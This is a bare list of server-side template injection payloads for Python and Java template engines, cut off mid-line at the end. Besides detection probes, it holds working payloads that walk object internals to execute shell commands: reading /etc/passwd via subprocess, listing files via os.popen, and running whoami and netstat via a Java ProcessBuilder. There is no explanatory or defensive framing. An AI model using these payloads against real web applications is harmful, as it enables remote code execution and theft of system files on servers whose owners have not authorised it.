# SSTI_Payloads 

${{<%[%'"}}%
${{7*7}}
${{3*'3'}}
<%= 3 * 3 %>
${6*6}
{{dump(app)}}
{{app.request.server.all|join(',')}}
{{config.items()}}
{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}}
{{ ''.__class__.__mro__[2].__subclasses__() }}
{{''.__class__.__base__.__subclasses__()}}
{{''.__class__.__base__.__subclasses__()[227]('cat /etc/passwd', shell=True, stdout=-1).communicate()}}
{{''.__class__.mro()[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("var x=new java.lang.String('xxx')")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("var x=new java.lang.ProcessBuilder; x.command("whoami"); x.start()")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("var x=new java.lang.ProcessBuilder; x.command("netstat"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance
